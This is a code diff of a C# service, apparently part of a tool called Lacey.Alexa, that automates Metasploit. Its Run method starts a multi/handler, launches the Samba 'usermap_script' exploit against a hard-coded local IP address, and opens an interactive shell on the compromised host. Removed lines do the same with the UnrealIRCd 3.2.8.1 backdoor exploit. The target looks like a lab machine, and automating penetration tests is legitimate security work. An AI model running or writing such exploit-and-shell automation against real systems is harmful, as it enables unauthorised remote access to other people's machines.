@@ -1,6 +1,5 @@
 ﻿using System.Linq;
 using System.Threading.Tasks;
-using Lacey.Alexa.Common.Metasploit.Const;
 using Lacey.Alexa.Common.Metasploit.Extensions;
 using Lacey.Alexa.Common.Metasploit.Providers;
 using Microsoft.Extensions.Logging;
@@ -23,16 +22,12 @@ namespace Lacey.Alexa.Explorer.Services.Services.Concrete
 
         public async Task Run()
         {
-            const string rHost = "192.168.0.13";
-            // var exploit= await _metasploit.MultiHandlerExec();
-            // await _metasploit.UnrealIrcd3281BackdoorExec(rHost);
-            // var shell = await _metasploit.WaitModuleJob(ModuleNames.UnrealIrcd3281Backdoor, exploit.JobId);
-            // await _metasploit.RunShell(shell.First().Key);
-
-            var exploit = await _metasploit.MultiHandlerExec();
-            await _metasploit.UsermapScriptExec(rHost);
-            var shell = await _metasploit.WaitModuleJob(ModuleNames.UsermapScript, exploit.JobId);
-            await _metasploit.RunShell(shell.First().Key);
+            const string rHost = "192.168.0.14";
+            const string exploit = "multi/samba/usermap_script";
+            var result = await _metasploit.MultiHandler();
+            await _metasploit.Exploit(exploit, rHost);
+            var shell = await _metasploit.WaitModuleJob(exploit, result.JobId);
+            await _metasploit.ShellInteract(shell.First().Key);
         }
     }
 }
